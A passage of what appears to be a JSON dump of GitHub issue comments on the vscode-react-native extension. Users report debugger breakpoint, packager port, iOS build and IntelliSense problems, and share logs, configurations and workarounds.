Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n. ",
    "carlthuringer": "I am also having this issue. I tried your advice, @vladimir-kotikov but it does not enable breakpoints. Strangely it seemed to be working before, but many changes later it is now broken.. ",
    "mitja13": "@vladimir-kotikov the debug is working now, but not sure what was changed. did reconstruct the project structure from a new init (or package update did it).. ",
    "mostafaeweda": "same here. ",
    "EduardJS": "Hello. Unfortunately, I'm facing the very same issue.\nAdding a breakpoint, appears greyed out, with an Unverified Breakpoint note. \nNote that the debug connsole has successfully established a connection to the proxy packager.\nAlso, I don't have any errors inside Help > DevTools > Console, iOS app's running ok, removed ios/build files so the packager can create a fresh batch of files ..\nPlease advise. Also mentioning the fact that I have just generated a clean project, via:\nreact-native init test\nWent in Debug section, clicked gear icon, selected React-Native environment as it asked me, then chose Debug iOS from the dropdown and clicked Run.\nPackager started, no error messages, app started, debug saying success, as per the post above, but when creating a breakpoint, the greyed out circle appears.\nLeaving here the package json created by react-init.\njson\n{\n    \"name\": \"test\",\n    \"version\": \"0.0.1\",\n    \"private\": true,\n    \"scripts\": {\n        \"start\": \"node node_modules/react-native/local-cli/cli.js start\",\n        \"test\": \"jest\"\n    },\n    \"dependencies\": {\n        \"react\": \"16.0.0-alpha.12\",\n        \"react-native\": \"0.48.1\"\n    },\n    \"devDependencies\": {\n        \"babel-jest\": \"21.0.0\",\n        \"babel-preset-react-native\": \"3.0.2\",\n        \"jest\": \"21.0.1\",\n        \"react-test-renderer\": \"16.0.0-alpha.12\"\n    },\n    \"jest\": {\n        \"preset\": \"react-native\"\n    }\n}\nSCREENSHOT OF IT RUNNING HERE. Well, that was easy.\nYou should really highlight this in the README, as I've looked again, under Get Started, and I couldn't find it it.\nThanks a lot!\n. ",
    "deadrats": "Hi there, I had an \"unverified\" BP issue, but I realized that the file was actually a soft link (ln).\nSetting BP in the real file was fine... Le Sat, 21 Oct 2017 12:14:31 +0000 (UTC),\nSerge Svekolnikov notifications@github.com a \u00e9crit :\n\nHi @deadrats, thank you for your comment, can you, please, provide us some more info? What file\ndid you have as a soft link? I'm asking because I was not able to make RN packager to work with\nsoft links. \n\n\nYes, sure.\nI forgot to mention it was on Linux. \nFiles are:\njohn@TaGaDaJoHn:~/src/irc4$ ll py\n-rw-rw-r-- 1 john john     43 oct.  12 12:55 00.py\n-rw-rw-r-- 1 john john  26047 oct.  17 18:17 app.py\n-rwxrwxr-x 1 john john  30075 oct.  17 17:10 bot.py\n-rw-rw-r-- 1 john john  47208 oct.  17 17:32 cmd.py\nlrwxrwxrwx 1 john john      6 janv. 14  2016 cmds.py -> cmd.py\n-rw-rw-r-- 1 john john  22909 oct.   7 10:18 dfun.py\n-rw-rw-r-- 1 john john   1708 sept. 21 16:04 dgen2.py\n-rw-rw-r-- 1 john john  22505 oct.  11 12:31 dial.py\n-rw-rw-r-- 1 john john  20591 oct.   1 17:09 div.py\n-rw-rw-r-- 1 john john  19571 sept. 21 18:38 dobj.py\n-rw-rw-r-- 1 john john   7102 juin  11 08:30 dold.py\n-rw-rw-r-- 1 john john   1151 mars   2  2017 eliza.py\n-rwxrwxr-x 1 john john    294 juil. 25 12:00 fltacc2.py\n-rwxrwxr-x 1 john john    243 mars  19  2017 fltacc.py\n-rw-rw-r-- 1 john john  29498 sept. 24 07:14 fun.py\n-rw-rw-r-- 1 john john 157552 oct.  18 02:00 game.py\n-rw-rw-r-- 1 john john  27260 oct.   5 18:39 gen.py\n-rw-rw-r-- 1 john john  33187 sept. 13 16:15 hi.py\n-rw-r--r-- 1 john john  13185 mai   10 17:37 ircbot.py\n-rw-r--r-- 1 john john  48707 ao\u00fbt   7 18:07 irclib.py\n-rw-rw-r-- 1 john john  24990 sept. 22 20:23 irc.py\n-rw-rw-r-- 1 john john  13871 ao\u00fbt  28 21:27 lang.py\n-rw-rw-r-- 1 john john  28278 mars  22  2017 metaphone.py\n-rw-rw-r-- 1 john john  25327 oct.  20 13:24 net.py\n-rw-rw-r-- 1 john john  28125 oct.  17 18:56 obj.py\nlrwxrwxrwx 1 john john      2 juil. 11  2016 p2.py -> p2\n-rw-rw-r-- 1 john john   1220 ao\u00fbt  18 21:06 params.py\n-rw-rw-r-- 1 john john    659 mars  25  2016 parms.py\n-rwxrwxr-x 1 john john  13692 oct.  17 18:43 psy.py\n-rw-rw-r-- 1 john john  27220 oct.   3 14:58 run.py\n-rw-rw-r-- 1 john john  14603 oct.   8 08:44 scr.py\n-rw-rw-r-- 1 john john 287015 oct.  20 14:05 toy.py\n-rw-rw-r-- 1 john john  30224 oct.   8 19:57 trig.py\n-rw-rw-r-- 1 john john  13338 oct.  17 19:32 utl.py\n-rw-rw-r-- 1 john john  10955 ao\u00fbt  10 11:56 vrac.1.py\n-rw-rw-r-- 1 john john  17301 ao\u00fbt   6 13:19 vrac.2.py\n-rw-rw-r-- 1 john john  23620 sept. 28 10:16 vrac.3.py\n-rw-rw-r-- 1 john john  23620 sept. 28 08:28 vrac.py\nsoft links are 'file1 -> file2' if you're not familiar w/ Linux;\nI wasn't able to use \"cmd.py\" because it conflicts within \"pdb\", the standard low-level debugger.\nSo I made the soft link 'cmd.py -> cmds.py'\nBut seting the BP with code-insider did not work.. Until I set it at the right place !\n(the actual file)\nI realize this is doubly obolete ><\nThanks for all, have it easy\n--\nJoHn.\n. ",
    "jbreuer95": "+1\n. ",
    "zeflash": "Yes! It took me 3 hours to figure out what was wrong with my setup (first try at debugging an RN app) - I used the very latest version of RN.\nGoing back to 0.44 works. So much better! \n. ",
    "ulentini": "@iTOYS are you able to debug? Once I start the remote debugging it reloads and then, blank screen. If I turn it off, it reloads and it works.\nThis is my setup:\nmacOS Sierra 10.12.5\nVSCode 1.13.1\nExtension 0.3.2\nNode v8.1.3\nXcode 8.3.2\nI initialized a test project as you did (same command) to be sure it wasn't an additional module issue.\nUsing --version=react-native@0.44.0, it works.\n. @vladimir-kotikov It works now.\nThanks \ud83c\udf89 \nDo you know when you're going to update the extension on the marketplace?. Did you try with \"target\": \"iPad Pro 9.7\" in the Run iOS configuration?. Yes, it works for me. Actually the correct string is \"iPad Pro (9.7 inch)\" for my simulator, but still, it works.\nI'm on version 0.3.2. That's just a label, the iOS configuration is working fine for me, it switch simulator based on the parameter I set.. My bad, I just noticed that @hnq90 was referring to React Native: Run iOS. ",
    "fnicastri": "same problem here.\nmacOS Sierra 10.12.5\nVSCode 1.13.1\nExtension 0.3.2\nNode v6.11.0 or v8.1.3\nreact-native 0.45.0/0.45.1/0.46.0\nI have no problem debugging with chrome or react-native 0.44.0 on VSCode\nThanks\n. @Uby501 Thanks! you saved my day!. ",
    "RoJoHub": "+1\nsame as 0.46. @vladimir-kotikov \nIn vscode store ,version of tool is still 0.32.\nWhen do you go to the release?\nI'm new to here.\nThanks.\n. So am i.\nReact native                   0.44 \nVSCode:                         1.14.0 (1.14.0)\nReact Native Tools:       0.3.2. In vscode store ,version of tool is still 0.32.\nWhen do you go to the release?\nI'm new to here.\nThanks.. @RobIsHere \nWhere are u from?,I'm from china.\nYour launguaue mode is like chinese.\nhaha.\n:)\n. ",
    "asimolmez": "Please do not write change version to 0.44 also use chrome debug.It is not the main solution for this case!. ",
    "peterjuras": "Any news on the release in the extensions store? . Thanks this solved my issue! \ud83d\udc4d . ",
    "hnq90": "Btw, I've just create a patch here for just testing: https://github.com/hnq90/vscode-react-native/tree/feature/add_simulator_name_setting. @Uby501 Does it work? After read the source code of this extension, I found that it always starts iPhone 6 simulator.. @Uby501 There's no Run iOS configuration. I only see Debug iOS.. @vladimir-kotikov Yes, thank you for explanation.. @vladimir-kotikov Hi, should I close this PR?. @vladimir-kotikov It's good to hear that. I will keep it open for discussion but I think it's better to use target.. @vladimir-kotikov Yes, thank you. I'm glad to hear that.. ",
    "iainroyle": "I can confirm the same thing. White screen every time I started the debugger except for the very first time when it worked for some reason.\nWorks with RN 0.44 it seems.. Confirmed. Same platform except on Windows 10.. Confirmed. Unable to launch app in this release (except for the first time!) Reload from the app causes the entire app to be re-deployed again, which then fails with a network error every time.. How can I install the latest update? Let me know and I'll test. Thanks.. Thanks for your help. Works for me now.. ",
    "lyingd": "+1\nRN: 0.44\nvscode: 1.14.0. ",
    "aschrijver": "With Node 8.1.3 and VS Code 1.13.1 I didn't get the 'Unsupported...' error, but breakpoints where just not hit. This may be caused with issues of inspector protocol in v8. See this stackoverflow question for details.\nI downgraded node to 7.10.1 but now the issue is that code is run directly from disk, rather than through the generated js bundle, leading to my browserify shims to be ignored.\nMy tests succeed where they should fail. See: https://github.com/Microsoft/vscode/issues/26782. Thanks @iTOYS @vladimir-kotikov for pointing this out!. ",
    "Jkaveri": "This fix works on my end. Thank you very much.. @iainroyle I updated the file ~\\.vscode\\extensions\\vsmobile.vscode-react-native-0.3.2\\out\\debugger\\nodeDebugWrapper.js :)\nThank you. ",
    "christ776": "Hi, \nI'm trying to build it locally, just installed gulp globally, then installed gulp locally on the project dir and I'm now getting this\n```christian@Christians-MacBook-Pro:~/Documents/JavaScript/vscode-react-native$ gulp build\nmodule.js:471\n    throw err;\n    ^\nError: Cannot find module 'gulp-sourcemaps'\n    at Function.Module._resolveFilename (module.js:469:15)\n    at Function.Module._load (module.js:417:25)\n    at Module.require (module.js:497:17)\n    at require (internal/module.js:20:19)\n    at Object. (/Users/christian/Documents/JavaScript/vscode-react-native/gulpfile.js:6:18)\n    at Module._compile (module.js:570:32)\n    at Object.Module._extensions..js (module.js:579:10)\n    at Module.load (module.js:487:32)\n    at tryModuleLoad (module.js:446:12)\n    at Function.Module._load (module.js:438:3)\n. Oh, that did the trick. Sorry !\n[12:25:43] Using gulpfile ~/Documents/JavaScript/vscode-react-native/gulpfile.js\n[12:25:43] Starting 'check-imports'...\n[12:25:43] Starting 'check-copyright'...\n[12:25:47] Finished 'check-copyright' after 3.7 s\n[12:25:47] Finished 'check-imports' after 3.83 s\n[12:25:47] Starting 'build'...\n[12:25:47] Building with preprocessor context: {\"PROD\":true}\n[12:25:49] Finished 'build' after 2.55 s\n```. ",
    "mark0978": "No, but I'll do it today\nOn Fri, Aug 11, 2017 at 4:14 AM, Vladimir Kotikov notifications@github.com\nwrote:\n\n@mark0978 https://github.com/mark0978 - just a friendly ping - have you\nhad a chance to upgrade the extension to see if the problems with\nreinstalling node_modules are resolved?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/488#issuecomment-321765271,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAGeprwPyrVGUkyL-ycZOkUgh80Y02Hsks5sXBt8gaJpZM4Ojbul\n.\n. So when I run it with expo, everything works.\nStarting React Native packager...\n12:39:15 PM\nScanning 713 folders for symlinks in /Users/markjones/projects/sublyjs/node_modules (6ms)\n12:39:16 PM\nLoading dependency graph.\n12:39:16 PM\nRunning packager on port 19001.\n12:39:16 PM\n12:39:17 PM\nDependency graph loaded.\n12:39:17 PM\nProject opened! You can now use the \"Share\" or \"Device\" buttons to view your project.\n\nWhen I run it with vscode-react-native 0.4.1 I get this error:\n```\nLooking for JS files in\n   /Users/markjones/projects/sublyjs \nReact packager ready.\n### Packager started.\nLoading dependency graph, done.\nBundling index.ios.js  0.0% (0/1), failed.\nerror: bundling failed: \"Cannot find entry file index.ios.js in any of the roots: [\\\"/Users/markjones/projects/sublyjs\\\"]\"\n```. ",
    "lydell": "Is the source-map-resolve package helpful to you? I'm not sure that source-map-resolve is a good abstraction anymore. If it is to you we can try to fix things. Otherwise it might be worth having source-map-resolve as a reference while implementing something on your own.. ",
    "zimmed": "I'm experiencing the same issue.. ",
    "boguscoder": "sorry my sourceRoot had to be absolute path, closing now. ",
    "gino8080": "@vladimir-kotikov I can confirm i get the same behaviour,\nno suggest while typing, but i got all the list with Ctrl+Space \ni have typescript 2.4.2 installed globally and also in the project folder\nthank you!. ",
    "aliazizi": "I know this issue is closed but for more information I get very strange issue\nI figure out its because of index.d.ts in react-native types in create method\nSo I change the type for test from\nexport function create<T extends NamedStyles<T> | NamedStyles<any>>(styles: T): T;\nto\nexport function create<T extends NamedStyles<T> | NamedStyles<any>>(styles: { [P in keyof T]: ViewStyle | TextStyle | ImageStyle }): T;\nI change style: T to actual type.\nSo now I get hint for style all styles except the first one!\nIn my case my first one is container So I did not get any hint for this but for other it's work perfect!. ",
    "ddthuan87": "today, i'm got a same problem =((. ",
    "SrikanthKabadi": "@vladimir-kotikov \nNot understanding on how to do this. iOS folder doesn't reside parallel to node_modules folder. Xcode project resides in \"../App/\". \nI am trying to add this by adding this to launch.json file like this. \n\"runArguments\": [\n    \"--project-path\", \"../App/\"\n]\nBut when I try to run the app, it says Error while executing command 'react-native run-ios --simulator iPhone 8 Plus --no-packager'. I see that runArguments is not being respected. . @iTOYS Since it is fixed now, how can I use this? Should I wait till the update is released?. @iTOYS Now it says Error: ENOENT: no such file or directory, scandir '/Users/<username>/<path-to-repo>/ios'. @iTOYS Now it says Error: ENOENT: no such file or directory, scandir '<path-to-repo>/ios'. @iTOYS I don't have iOS folder itself in my project. I added react native support to existing project. \nApp folder structure looks like this. \n```\n\n\n                App.xcodeproj\n                App.xcworkspace\n    <Libraries>\n\n    <SDK>\n\n    <React-Native>\n            node_modules\n            package.json\n            tsconfig.json\n            index.ios.js\n            src\n\n```. I have set \"\u2014project-path\" to iOS native code.\nIf I run it from command line like this react-native run-ios --project-path \"../App/\u201c, it works.\nvia Newton Mail [https://cloudmagic.com/k/d/mailapp?ct=dx&cv=9.8.79&pv=10.13.0&source=email_footer_2]\nOn Mon, Oct 30, 2017 at 6:51 PM, Artem Egorov notifications@github.com wrote:\nYou should set \"--project-path\" directly to folder with ios native code:\nIt's \"ios\" folder for react-native init project,\nCould you please try to run it from command line, is it work?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub [https://github.com/Microsoft/vscode-react-native/issues/567#issuecomment-340441423] , or mute the thread [https://github.com/notifications/unsubscribe-auth/AB_fC1FP8NNk1DP1Z3QmzgTwJ3190jOhks5sxc1LgaJpZM4QLC-F] .. If I just do a soft link ln -s ../App/ ios it works. But I don\u2019t know why ios folder is that important. It used to work flawlessly with iosRelativeProjectPath argument in launch.json earlier.\nvia Newton Mail [https://cloudmagic.com/k/d/mailapp?ct=dx&cv=9.8.79&pv=10.13.0&source=email_footer_2]\nOn Mon, Oct 30, 2017 at 7:02 PM, Artem Egorov notifications@github.com wrote:\nCould you please put you ios native into \"../App/ios\" folder, just for test?\nI have idea.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub [https://github.com/Microsoft/vscode-react-native/issues/567#issuecomment-340444396] , or mute the thread [https://github.com/notifications/unsubscribe-auth/AB_fCxpr9jxE8WpBsLvYmjkd1xjI0A2xks5sxc_sgaJpZM4QLC-F] .. Oh!! okay. Thank you so much :) Will do softlinking only then.\nvia Newton Mail [https://cloudmagic.com/k/d/mailapp?ct=dx&cv=9.8.79&pv=10.13.0&source=email_footer_2]\nOn Mon, Oct 30, 2017 at 7:15 PM, Artem Egorov notifications@github.com wrote:\nUnfortunately it's very important for us(\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub [https://github.com/Microsoft/vscode-react-native/issues/567#issuecomment-340447852] , or mute the thread [https://github.com/notifications/unsubscribe-auth/AB_fC8_m2SMrVH955439WrcrBOSxYC1Iks5sxdLogaJpZM4QLC-F] .. ",
    "JohannBlake": "Oops. Posted to wrong forum. Can't seem to delete it. No delete button.. ",
    "alexisbg": "Yes exactly\n. ",
    "tafelito": "@vladimir-kotikov I'm facing the same issue now, but the remote debug is indeed automatically enabled now, but the breakpoints are still grayed out. Not logs on the dev tools console. I updated  vscode to version 1.22.2 but still happening. Should I open a new issue?. I disabled both TS builtin plugins and installed Flow extension\n\nAnd I'm using \n\nJust by creating a new project with react-native init and adding flow-bin dependency it's possible to reproduce this. \nwhen I try to use the autocomplete for styles, there are no suggestions at all\n\nAlso If I try to navigate to a style definition by doing cmd+click in a style prop, it doesn't do anything compared to doing the same on top of the styles object, it does go to the definition in that case\n . Yes that's how I did it but using flow-bin locally instead of globally. Isn't that the reason to use flow.useNPMPackagedFlow=true? (I tried global too just in case but it didn't work either). \nI disabled builtin TS packages because that's what it says on the extension docs. And if you don't do it, definitions get duplicated. So if you try to go to definition it shows you multiple definitions instead of actually going.\n\n. @annakocheshkova I followed both the issues you mentioned but none of them seems to have a solution. It seems there could be some conflicts with other extensions. I disabled the flow support extension and another one to add react/react native snippets and that make it appeared again. If I enabled back the extensions, rn debug option disappears again. I checked the devtools console but there are no errors there. Anything else I should check?\nNot sure if it's related, but as I reported here #529, when I managed to make it appear, when I'm actually debugging, breakpoints are grayed out \nUPDATE: I tried to enable back the debug disabling all the extensions as I did before but this time even tho all extensions were disabled, the debug option didn't appear. They only appear if I do but I first reported here, remove the flow-bin from package.json (no saving needed). Another thing that is not working either is the intellisense. Also not sure if it's related or not, but to me it seems that something is creating a conflict and might be all related. ",
    "DonkeyTronKilla": "Thanks for the reply @vladimir-kotikov. I tried disabling all extensions and still I was have this issue. I get intellisense for React but not React Native. I have opened an issue with VSCode repo instead so I will close this issue.. ",
    "aaveidt": "@DonkeyTronKilla how did you solve this trouble?. ",
    "callagga": "I've an issue trying to get custom port porting.  so is the way forward:\na) await React Native Tool v0.4.3 to be release\nb) then put the above-mentioned config into FILE - PREFERENCES - SETTINGS (i.e. user settings)?   i.e. no need to touch launch.json? \nAny idea when React Native Tool v0.4.3 will be released?. any update iTOYS re the v0.4.3 release at all?. oh sorry - I see my mistake re checking for update versions.... I'll check out custom port approach now. I'm getting this on one of my IOS projects too:\n[Info] Building and running application.\n[Error] Error: Error while executing command 'react-native run-ios --simulator --no-packager': Error while executing command 'react-native run-ios --simulator --no-packager'\nI just noted a project that worked has \"Metro Bundler ready\" listed during the startup, whereas the project that is not working has \"React packager ready\".\nI'm not sure however how you get the \"Metro Bundler\" selected (or what this is). Both launch.json entries seem to be the same??/\n. oh - ok so basically it's a \"react native\" upgrade you're referring to here right?. many thanks. have also been getting:\n[Error] Error: Error while executing command 'react-native run-ios --simulator --no-packager': spawn react-native ENOENT\nIf I then (in vscode) click on terminal I can run react-native e.g.\n```\nGregs-MacBook-Pro:testNavigation Greg$ react-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.50.3\nGregs-MacBook-Pro:testNavigation Greg$\n```\n. just fixed it for me iTOYS!  thanks very much. ",
    "mimranshahid": "I spend a couple of hours to fix the issue and the fix that works for me is:\n\nI load the project in VSCode and replace all the occurrence of 8081\nAfter first step, I was successful in running the project in Xcode however I was facing issue in VSCode\nManaged to fix the issue in VSCode by changing the value in Setting.json file under .vsCode\\Setting.json\n\n\"react-native.packager.port\": 7070. ",
    "auchenberg": "Our Chrome debugger doesn't support React Native. We have a dedicated project, https://github.com/Microsoft/vscode-react-native, for this. . ",
    "vettukal": "@iTOYS Trying react-native Extension.\n\n\nLaunch.json\n{\n    // Use IntelliSense to learn about possible attributes.\n    // Hover to view descriptions of existing attributes.\n    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Attach to packager\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"attach\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        }\n    ]\n}\n\n\nSelecting Debug iOS and pressing play button.\nOutput in Debug Console:\n[vscode-react-native] Starting React Native Packager.\n[vscode-react-native] Prewarming bundle cache. This may take a while ...\n[vscode-react-native] Building and running application.\n[vscode-react-native] Executing command: react-native run-ios --simulator\nScanning 716 folders for symlinks in /Users/16527/ios/dir2/myios-app/node_modules (5ms)\nENOENT: no such file or directory, uv_chdir\n[Error] \"Could not debug. Error while executing command 'react-native run-ios --simulator': Error while executing command 'react-native run-ios --simulator'\"\n\nNow running the app from xcode and after starting the packager, I select \"Attach to packager\" and run play button.\nThe app runs fine when its not in debug mode.\n\n[vscode-react-native] Debugger ready. Enable remote debugging in app.\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n4. Now to enter debug mode, press CMD+D and select Debug remotely\nApp fails to load.\nDebug Console output\n[vscode-react-native] Debugger worker loaded runtime on port 35151\nError pops up the top. Output:\nEnsure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the tar\n. React native version: 0.46.3\nreact-native run-ios --simulator will give ENOENT: no such file or directory, uv_chdir error. I am trying this on an native app on which RN was added. Its not a pure RN app.\nWill have to try react-native init and check whether it works on a new app or not. . @iTOYS I tried creating a new project as given in https://facebook.github.io/react-native/docs/getting-started.html.\nand then followed the steps as mentioned in https://github.com/Microsoft/vscode-react-native/blob/master/doc/expo.md.\nBut debug in expo does not result in anything. There is not debug console output or anything. No error etc.. Also I could not see any file as ${workspaceRoot}/.vscode/launchReactNative.js. Even after 'ejecting' it didn't work and didn't output anything.. Yes the app was running fine in Chrome in debug mode.\nOn Thu, Oct 5, 2017 at 2:19 PM, Vladimir Kotikov notifications@github.com\nwrote:\n\n@vettukal https://github.com/vettukal ${workspaceRoot}/.vscode/\nlaunchReactNative.js doesn't need to exist - IIRC this entry was required\nto be specified due to some VSCode debug protocol limitation, when launch\nconfiguration must contain \"program\" property, but react-native debugger\ndoesn't use it anyway. @iTOYS https://github.com/itoys - we might want\nto revisit this to see if it's still required.\nRegarding running app and attachning to packager - those two lines\n[vscode-react-native] Debugger worker loaded runtime on port 35151\nEnsure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the tar\nare likely saying that Node failed to run bundled JS code perhaps because\nof some issues with JS which compiles fine but then crashes at load time.\n@vettukal https://github.com/vettukal can you double check that the app\nis running fine in debug mode without VSCode (i.e. in Chrome)?\nFor running CRNA app in Expo - @iTOYS https://github.com/itoys, were\nyou able to repro it?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/537#issuecomment-334401219,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABMGcBX7lcEqNwEc40aB9HhaJs_D2eRVks5spJg1gaJpZM4Pd4e1\n.\n. \n",
    "kralcifer-ms": "That worked.  Thanks!. I verified that 4.4 fixes it.  Thanks for the quick turnaround!. @iTOYS I just went to try this for first time and can't seem to get env vars injected into the app.  I've tried env in launch.json, .envFile referred to in launch.json, Workspace Settings -> react-native.ios.env.device, and setting in console that launches vscode.\nI'm trying to use the visionmedia debug npm package.  In my main App.tsx I can enable logging in App.tsx and I see the output of logging from various modules in my React Native app in the Debug Console (no colors yet but different problem to solve there next!). Now, rather than enabling the logging from javascript in App.tsx I should be able to drive it from env variable called DEBUG that should turn on which components to log.  At breakpoints in my running app, in global I see DEV which RN injects somehow but have yet to see the DEBUG env that I've defined several ways as mentioned in my first paragraph.  Any tips on how to spot what's wrong?\nRN: 0.49.1\nvscode: 1.21.1 (Mac)\nreact native tools: 0.6.6\nlaunch.json I've tried workspaceRoot and workspaceFolder and neither work:\n        {\n            \"name\": \"Debug iOS device\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"env\": {\n                \"DEBUG\": \"mixerViewing\",\n            },\n            \"envFile\": \"${workspaceRoot}/.env\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"target\": \"device\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n.env file sits next to package.json and contains:\nDEBUG=\"mixerViewing\"\nI've tried with and without quotes.\nWorkspace Settings I added this:\n    \"react-native.ios.env.device\": {\n        \"DEBUG\": \"mixerViewing\"\n    }\nand finally, in the console window that I launch vscode with I did:\nexport DEBUG=mixerViewing\nand then typing 'env' shows DEBUG and after launching vscode in intergrated console in there it also shows DEBUG but when I debug my app DEBUG does not show in global.\nDEBUG has yet to appear in global when I stop at a breakpoint when debugging my app.. ",
    "dark2201": "@iTOYS If I have flow-bin installed globally and .flowconfig generated by react-native init in project directory does it affect anyhow TypeScript intellisense? The intellisense works if I type inside style={{ if i type here }} but it doesn't work inside StyleSheet.create.. @vladimir-kotikov so when using vscode I don't have to install typescript locally to use typescript? or it's only for intellisense?\nif presence doesn't matter that means I can safely delete flowconfig? thank you for answer btw. . Weird, after like few minutes since creating this issue it started to work. (?????????????). ",
    "GrandPoohBear": "Updated to 0.4.4, but now I think I might be hitting a different issue:\nOutput:\n```\n[Info] Making sure your project uses the correct dependencies for exponent. This may take a while...\nChecking if this is Expo app......\n.........\n[Info] Starting Packager\nScanning 689 folders for symlinks in /Users/andy/git/starsnap/node_modules (4ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running packager on port 8081.                                            \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep this packager running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own packager instance if you          \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   /Users/andy/git/starsnap\n   /Users/andy/git/starsnap/.vscode \nReact packager ready.\n[Info] Packager started.\n[Warning] Warning: You are using npm version 5.4.2. There may be bugs in this version, use it at your own risk. We recommend version 4.6.1.\n[Warning] Warning: You are using npm version 5.4.2. There may be bugs in this version, use it at your own risk. We recommend version 4.6.1.\n[Error] Error starting tunnel: XDLError: TypeError: Cannot read property 'toLowerCase' of undefined\n[Error] Error starting tunnel: XDLError: TypeError: Cannot read property 'toLowerCase' of undefined\n[Error] XDLError: TypeError: Cannot read property 'toLowerCase' of undefined\n2017-10-26 22:31 node[47932] (FSEvents.framework) FSEventStreamStart: register_with_server: ERROR: f2d_register_rpc() => (null) (-22)\n2017-10-26 22:31 node[47932] (FSEvents.framework) FSEventStreamStart: register_with_server: ERROR: f2d_register_rpc() => (null) (-22)\n2017-10-26 22:31 node[47932] (FSEvents.framework) FSEventStreamStart: register_with_server: ERROR: f2d_register_rpc() => (null) (-22)\n2017-10-26 22:31 node[47932] (FSEvents.framework) FSEventStreamStart: register_with_server: ERROR: f2d_register_rpc() => (null) (-22)\n ERROR  Error watching file for changes: EMFILE\n{\"code\":\"EMFILE\",\"errno\":\"EMFILE\",\"syscall\":\"Error watching file for changes:\",\"filename\":null}\nError: Error watching file for changes: EMFILE\n    at exports._errnoException (util.js:1020:11)\n    at FSEvent.FSWatcher._handle.onchange (fs.js:1421:9)\n```\nIn the Debug Console:\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nCould not debug. TypeError: Cannot read property 'toLowerCase' of undefined\nError processing \"disconnect\": TypeError: Cannot read property 'noDebug' of undefined\n    at Object.terminateSession (/Users/andy/.vscode/extensions/ms-vscode.node-debug2-1.18.3/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:198:63)\n    at Object.terminateSession 